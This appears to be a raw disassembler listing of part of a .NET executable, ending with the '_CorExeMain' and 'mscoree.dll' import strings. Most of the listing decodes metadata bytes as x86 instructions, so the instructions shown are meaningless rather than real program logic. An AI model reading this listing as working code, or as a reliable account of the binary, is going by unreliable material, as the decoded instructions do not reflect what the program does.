  40ca92:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40ca99:	6f                   	outsl  %ds:(%esi),(%dx)
  40ca9a:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40caa1:	04 49                	add    $0x49,%al
  40caa3:	74 65                	je     0x40cb0a
  40caa5:	6d                   	insl   (%dx),%es:(%edi)
  40caa6:	00 00                	add    %al,(%eax)
  40caa8:	03 07                	add    (%edi),%eax
  40caaa:	01 08                	add    %ecx,(%eax)
  40caac:	04 00                	add    $0x0,%al
  40caae:	01 08                	add    %ecx,(%eax)
  40cab0:	0e                   	push   %cs
  40cab1:	03 07                	add    (%edi),%eax
  40cab3:	01 02                	add    %eax,(%edx)
  40cab5:	05 00 00 12 80       	add    $0x80120000,%eax
  40caba:	b1 05                	mov    $0x5,%cl
  40cabc:	20 01                	and    %al,(%ecx)
  40cabe:	0e                   	push   %cs
  40cabf:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cac4:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40caca:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cad0:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cad5:	03 02                	add    (%edx),%eax
  40cad7:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cadc:	14 07                	adc    $0x7,%al
  40cade:	08 0e                	or     %cl,(%esi)
  40cae0:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cae6:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40caec:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40caf2:	20 03                	and    %al,(%ebx)
  40caf4:	01 11                	add    %edx,(%ecx)
  40caf6:	80 d5 11             	adc    $0x11,%ch
  40caf9:	80 d9 11             	sbb    $0x11,%cl
  40cafc:	80 dd 05             	sbb    $0x5,%ch
  40caff:	00 02                	add    %al,(%edx)
  40cb01:	02 0e                	add    (%esi),%cl
  40cb03:	0e                   	push   %cs
  40cb04:	06                   	push   %es
  40cb05:	20 01                	and    %al,(%ecx)
  40cb07:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cb0c:	20 01                	and    %al,(%ecx)
  40cb0e:	08 08                	or     %cl,(%eax)
  40cb10:	07                   	pop    %es
  40cb11:	00 01                	add    %al,(%ecx)
  40cb13:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cb18:	07                   	pop    %es
  40cb19:	20 02                	and    %al,(%edx)
  40cb1b:	01 12                	add    %edx,(%edx)
  40cb1d:	80 c9 08             	or     $0x8,%cl
  40cb20:	06                   	push   %es
  40cb21:	20 01                	and    %al,(%ecx)
  40cb23:	01 12                	add    %edx,(%edx)
  40cb25:	80 f1 09             	xor    $0x9,%cl
  40cb28:	20 02                	and    %al,(%edx)
  40cb2a:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cb2f:	80 f5 05             	xor    $0x5,%ch
  40cb32:	20 02                	and    %al,(%edx)
  40cb34:	08 08                	or     %cl,(%eax)
  40cb36:	08 06                	or     %al,(%esi)
  40cb38:	20 02                	and    %al,(%edx)
  40cb3a:	01 12                	add    %edx,(%edx)
  40cb3c:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cb41:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cb44:	09 20                	or     %esp,(%eax)
  40cb46:	03 01                	add    (%ecx),%eax
  40cb48:	12 61 02             	adc    0x2(%ecx),%ah
  40cb4b:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cb51:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cb57:	01 0e                	add    %ecx,(%esi)
  40cb59:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cb5f:	02 09                	add    (%ecx),%cl
  40cb61:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cb64:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cb6a:	0c 20                	or     $0x20,%al
  40cb6c:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cb71:	08 08                	or     %cl,(%eax)
  40cb73:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cb79:	01 11                	add    %edx,(%ecx)
  40cb7b:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cb81:	02 12                	add    (%edx),%dl
  40cb83:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cb86:	02 08                	add    (%eax),%cl
  40cb88:	08 05 20 01 08 12    	or     %al,0x12080120
  40cb8e:	25 06 00 02 08       	and    $0x8020006,%eax
  40cb93:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cb98:	03 08                	add    (%eax),%ecx
  40cb9a:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cb9f:	20 01                	and    %al,(%ecx)
  40cba1:	01 12                	add    %edx,(%edx)
  40cba3:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cba9:	1c 0c                	sbb    $0xc,%al
  40cbab:	07                   	pop    %es
  40cbac:	06                   	push   %es
  40cbad:	1c 02                	sbb    $0x2,%al
  40cbaf:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cbb4:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cbba:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cbbd:	02 07                	add    (%edi),%al
  40cbbf:	20 02                	and    %al,(%edx)
  40cbc1:	02 08                	add    (%eax),%cl
  40cbc3:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cbc9:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cbcf:	07                   	pop    %es
  40cbd0:	0a 12                	or     (%edx),%dl
  40cbd2:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cbd9:	08 12 81 
  40cbdc:	41                   	inc    %ecx
  40cbdd:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cbe3:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cbe8:	4d                   	dec    %ebp
  40cbe9:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cbee:	0e                   	push   %cs
  40cbef:	05 00 00 12 81       	add    $0x81120000,%eax
  40cbf4:	41                   	inc    %ecx
  40cbf5:	05 20 00 12 81       	add    $0x81120020,%eax
  40cbfa:	55                   	push   %ebp
  40cbfb:	06                   	push   %es
  40cbfc:	00 00                	add    %al,(%eax)
  40cbfe:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40cc03:	00 01                	add    %al,(%ecx)
  40cc05:	0e                   	push   %cs
  40cc06:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40cc0b:	01 11                	add    %edx,(%ecx)
  40cc0d:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40cc14:	41                   	inc    %ecx
  40cc15:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40cc1b:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40cc22:	49                   	dec    %ecx
  40cc23:	0e                   	push   %cs
  40cc24:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40cc2a:	0e                   	push   %cs
  40cc2b:	0e                   	push   %cs
  40cc2c:	0e                   	push   %cs
  40cc2d:	0e                   	push   %cs
  40cc2e:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cc33:	1c 07                	sbb    $0x7,%al
  40cc35:	20 02                	and    %al,(%edx)
  40cc37:	01 0e                	add    %ecx,(%esi)
  40cc39:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40cc3f:	0a 02                	or     (%edx),%al
  40cc41:	10 07                	adc    %al,(%edi)
  40cc43:	06                   	push   %es
  40cc44:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40cc4a:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40cc50:	0e                   	push   %cs
  40cc51:	02 05 20 00 12 81    	add    0x81120020,%al
  40cc57:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40cc5d:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40cc63:	91                   	xchg   %eax,%ecx
  40cc64:	04 20                	add    $0x20,%al
  40cc66:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cc69:	04 07                	add    $0x7,%al
  40cc6b:	02 02                	add    (%edx),%al
  40cc6d:	02 03                	add    (%ebx),%al
  40cc6f:	20 00                	and    %al,(%eax)
  40cc71:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cc74:	02 18                	add    (%eax),%bl
  40cc76:	02 03                	add    (%ebx),%al
  40cc78:	07                   	pop    %es
  40cc79:	01 0e                	add    %ecx,(%esi)
  40cc7b:	05 00 00 12 81       	add    $0x81120000,%eax
  40cc80:	9d                   	popf
  40cc81:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cc86:	1c 0a                	sbb    $0xa,%al
  40cc88:	07                   	pop    %es
  40cc89:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cc8e:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cc93:	20 01                	and    %al,(%ecx)
  40cc95:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cc9b:	0e                   	push   %cs
  40cc9c:	08 08                	or     %cl,(%eax)
  40cc9e:	06                   	push   %es
  40cc9f:	07                   	pop    %es
  40cca0:	02 02                	add    (%edx),%al
  40cca2:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cca8:	0e                   	push   %cs
  40cca9:	0e                   	push   %cs
  40ccaa:	0e                   	push   %cs
  40ccab:	05 20 00 11 81       	add    $0x81110020,%eax
  40ccb0:	ad                   	lods   %ds:(%esi),%eax
  40ccb1:	05 00 00 12 81       	add    $0x81120000,%eax
  40ccb6:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40ccbb:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40ccc1:	02 11                	add    (%ecx),%dl
  40ccc3:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40ccc9:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40ccd0:	12 81 8d 
  40ccd3:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40ccd9:	12 41 01             	adc    0x1(%ecx),%al
  40ccdc:	0e                   	push   %cs
  40ccdd:	05 20 01 01 13       	add    $0x13010120,%eax
  40cce2:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cce8:	00 06                	add    %al,(%esi)
  40ccea:	00 02                	add    %al,(%edx)
  40ccec:	0e                   	push   %cs
  40cced:	0e                   	push   %cs
  40ccee:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40ccf3:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40ccf8:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40ccfe:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cd04:	c5 09                	lds    (%ecx),%ecx
  40cd06:	00 02                	add    %al,(%edx)
  40cd08:	02 11                	add    (%ecx),%dl
  40cd0a:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cd10:	07                   	pop    %es
  40cd11:	02 12                	add    (%edx),%dl
  40cd13:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cd18:	01 02                	add    %eax,(%edx)
  40cd1a:	0e                   	push   %cs
  40cd1b:	10 02                	adc    %al,(%edx)
  40cd1d:	06                   	push   %es
  40cd1e:	00 01                	add    %al,(%ecx)
  40cd20:	01 12                	add    %edx,(%edx)
  40cd22:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40cd28:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40cd2f:	0e                   	push   %cs
  40cd30:	1c 11                	sbb    $0x11,%al
  40cd32:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40cd38:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40cd3f:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cd45:	05 07 20 02 12       	add    $0x12022007,%eax
  40cd4a:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40cd51:	12 60 0e             	adc    0xe(%eax),%ah
  40cd54:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cd59:	12 60 12             	adc    0x12(%eax),%ah
  40cd5c:	60                   	pusha
  40cd5d:	06                   	push   %es
  40cd5e:	15 12 41 01 12       	adc    $0x12014112,%eax
  40cd63:	60                   	pusha
  40cd64:	10 10                	adc    %dl,(%eax)
  40cd66:	01 01                	add    %eax,(%ecx)
  40cd68:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40cd6d:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40cd73:	1e                   	push   %ds
  40cd74:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40cd77:	01 12                	add    %edx,(%edx)
  40cd79:	60                   	pusha
  40cd7a:	09 20                	or     %esp,(%eax)
  40cd7c:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40cd82:	13 00                	adc    (%eax),%eax
  40cd84:	07                   	pop    %es
  40cd85:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cd8a:	12 60 04             	adc    0x4(%eax),%ah
  40cd8d:	20 00                	and    %al,(%eax)
  40cd8f:	13 00                	adc    (%eax),%eax
  40cd91:	05 20 01 02 13       	add    $0x13020120,%eax
  40cd96:	00 03                	add    %al,(%ebx)
  40cd98:	07                   	pop    %es
  40cd99:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40cda0:	e5 07                	in     $0x7,%eax
  40cda2:	20 01                	and    %al,(%ecx)
  40cda4:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40cdaa:	20 01                	and    %al,(%ecx)
  40cdac:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40cdb2:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40cdb5:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40cdbb:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40cdc1:	00 02                	add    %al,(%edx)
  40cdc3:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40cdc9:	0e                   	push   %cs
  40cdca:	1c 00                	sbb    $0x0,%al
  40cdcc:	05 12 82 05 11       	add    $0x11058212,%eax
  40cdd1:	82 09 0e             	orb    $0xe,(%ecx)
  40cdd4:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40cdd9:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40cddf:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40cde4:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40cdea:	45                   	inc    %ebp
  40cdeb:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40cdf1:	4d                   	dec    %ebp
  40cdf2:	1c 12                	sbb    $0x12,%al
  40cdf4:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cdf9:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cdfe:	0e                   	push   %cs
  40cdff:	0b 00                	or     (%eax),%eax
  40ce01:	01 15 12 45 01 13    	add    %edx,0x13014512
  40ce07:	00 12                	add    %dl,(%edx)
  40ce09:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40ce10:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40ce15:	4d                   	dec    %ebp
  40ce16:	1c 12                	sbb    $0x12,%al
  40ce18:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ce1d:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ce22:	0e                   	push   %cs
  40ce23:	17                   	pop    %ss
  40ce24:	20 0a                	and    %cl,(%edx)
  40ce26:	01 13                	add    %edx,(%ebx)
  40ce28:	00 13                	add    %dl,(%ebx)
  40ce2a:	01 13                	add    %edx,(%ebx)
  40ce2c:	02 13                	add    (%ebx),%dl
  40ce2e:	03 13                	add    (%ebx),%edx
  40ce30:	04 13                	add    $0x13,%al
  40ce32:	05 13 06 13 07       	add    $0x7130613,%eax
  40ce37:	13 08                	adc    (%eax),%ecx
  40ce39:	13 09                	adc    (%ecx),%ecx
  40ce3b:	05 07 01 12 82       	add    $0x82120107,%eax
  40ce40:	0d 07 20 03 01       	or     $0x1032007,%eax
  40ce45:	0e                   	push   %cs
  40ce46:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40ce4b:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40ce51:	06                   	push   %es
  40ce52:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40ce58:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40ce5e:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40ce63:	20 01                	and    %al,(%ecx)
  40ce65:	01 11                	add    %edx,(%ecx)
  40ce67:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40ce6e:	82 31 05             	xorb   $0x5,(%ecx)
  40ce71:	20 00                	and    %al,(%eax)
  40ce73:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40ce79:	01 12                	add    %edx,(%edx)
  40ce7b:	61                   	popa
  40ce7c:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40ce82:	08 20                	or     %ah,(%eax)
  40ce84:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40ce8a:	08 1a                	or     %bl,(%edx)
  40ce8c:	07                   	pop    %es
  40ce8d:	0a 12                	or     (%edx),%dl
  40ce8f:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40ce96:	21 1d 05 
  40ce99:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40ce9e:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cea5:	05 0c 00 05 01       	add    $0x105000c,%eax
  40ceaa:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40ceb0:	45                   	inc    %ebp
  40ceb1:	08 08                	or     %cl,(%eax)
  40ceb3:	04 07                	add    $0x7,%al
  40ceb5:	02 02                	add    (%edx),%al
  40ceb7:	08 09                	or     %cl,(%ecx)
  40ceb9:	00 02                	add    %al,(%edx)
  40cebb:	01 12                	add    %edx,(%edx)
  40cebd:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cec1:	4d                   	dec    %ebp
  40cec2:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cec7:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cecd:	05 08 05 07 07       	add    $0x7070508,%eax
  40ced2:	02 12                	add    (%edx),%dl
  40ced4:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40ced8:	08 07                	or     %al,(%edi)
  40ceda:	04 12                	add    $0x12,%al
  40cedc:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cee1:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cee6:	1c 06                	sbb    $0x6,%al
  40cee8:	07                   	pop    %es
  40cee9:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40ceef:	20 01                	and    %al,(%ecx)
  40cef1:	13 00                	adc    (%eax),%eax
  40cef3:	08 04 07             	or     %al,(%edi,%eax,1)
  40cef6:	01 12                	add    %edx,(%edx)
  40cef8:	60                   	pusha
  40cef9:	0e                   	push   %cs
  40cefa:	07                   	pop    %es
  40cefb:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cf00:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cf06:	12 60 07             	adc    0x7(%eax),%ah
  40cf09:	07                   	pop    %es
  40cf0a:	04 08                	add    $0x8,%al
  40cf0c:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cf11:	20 01                	and    %al,(%ecx)
  40cf13:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cf19:	64 04 00             	fs add $0x0,%al
  40cf1c:	01 0b                	add    %ecx,(%ebx)
  40cf1e:	0a 04 00             	or     (%eax,%eax,1),%al
  40cf21:	01 0b                	add    %ecx,(%ebx)
  40cf23:	0e                   	push   %cs
  40cf24:	04 00                	add    $0x0,%al
  40cf26:	01 0b                	add    %ecx,(%ebx)
  40cf28:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40cf2d:	0c 06                	or     $0x6,%al
  40cf2f:	00 01                	add    %al,(%ecx)
  40cf31:	0b 11                	or     (%ecx),%edx
  40cf33:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40cf3a:	04 00 01 
  40cf3d:	0a 0e                	or     (%esi),%cl
  40cf3f:	04 00                	add    $0x0,%al
  40cf41:	01 0a                	add    %ecx,(%edx)
  40cf43:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40cf48:	0c 06                	or     $0x6,%al
  40cf4a:	00 01                	add    %al,(%ecx)
  40cf4c:	0a 11                	or     (%ecx),%dl
  40cf4e:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40cf55:	04 00 01 
  40cf58:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40cf5d:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40cf61:	ad                   	lods   %ds:(%esi),%eax
  40cf62:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40cf67:	0c 07                	or     $0x7,%al
  40cf69:	07                   	pop    %es
  40cf6a:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40cf70:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40cf75:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40cf7b:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40cf81:	12 60 1d             	adc    0x1d(%eax),%ah
  40cf84:	0e                   	push   %cs
  40cf85:	0e                   	push   %cs
  40cf86:	08 12                	or     %dl,(%edx)
  40cf88:	60                   	pusha
  40cf89:	08 05 07 01 12 81    	or     %al,0x81120107
  40cf8f:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40cf94:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40cf9b:	05 08 08 06 00       	add    $0x60808,%eax
  40cfa0:	02 07                	add    (%edi),%al
  40cfa2:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40cfa7:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40cfae:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40cfb4:	00 02                	add    %al,(%edx)
  40cfb6:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40cfbc:	02 0b                	add    (%ebx),%cl
  40cfbe:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40cfc3:	02 06                	add    (%esi),%al
  40cfc5:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40cfca:	02 0a                	add    (%edx),%cl
  40cfcc:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40cfd1:	03 12                	add    (%edx),%edx
  40cfd3:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40cfda:	07 02 12 
  40cfdd:	60                   	pusha
  40cfde:	02 04 07             	add    (%edi,%eax,1),%al
  40cfe1:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40cfe7:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40cfec:	04 1d                	add    $0x1d,%al
  40cfee:	05 1d 05 08 05       	add    $0x508051d,%eax
  40cff3:	06                   	push   %es
  40cff4:	07                   	pop    %es
  40cff5:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40cffb:	00 01                	add    %al,(%ecx)
  40cffd:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d002:	06                   	push   %es
  40d003:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d009:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d00f:	05 08 20 02 01       	add    $0x1022008,%eax
  40d014:	12 61 11             	adc    0x11(%ecx),%ah
  40d017:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d01b:	04 12                	add    $0x12,%al
  40d01d:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d024:	1d 05 00 
  40d027:	00 50 d0             	add    %dl,-0x30(%eax)
	...
  40d032:	00 00                	add    %al,(%eax)
  40d034:	6e                   	outsb  %ds:(%esi),(%dx)
  40d035:	d0 00                	rolb   $1,(%eax)
  40d037:	00 00                	add    %al,(%eax)
  40d039:	20 00                	and    %al,(%eax)
	...
  40d04f:	00 60 d0             	add    %ah,-0x30(%eax)
	...
  40d062:	5f                   	pop    %edi
  40d063:	43                   	inc    %ebx
  40d064:	6f                   	outsl  %ds:(%esi),(%dx)
  40d065:	72 45                	jb     0x40d0ac
  40d067:	78 65                	js     0x40d0ce
  40d069:	4d                   	dec    %ebp
  40d06a:	61                   	popa
  40d06b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d072:	72 65                	jb     0x40d0d9
  40d074:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d078:	6c                   	insb   (%dx),%es:(%edi)
  40d079:	00 00                	add    %al,(%eax)
  40d07b:	00 00                	add    %al,(%eax)
  40d07d:	00 ff                	add    %bh,%bh
  40d07f:	25 00 20 40 00       	and    $0x402000,%eax
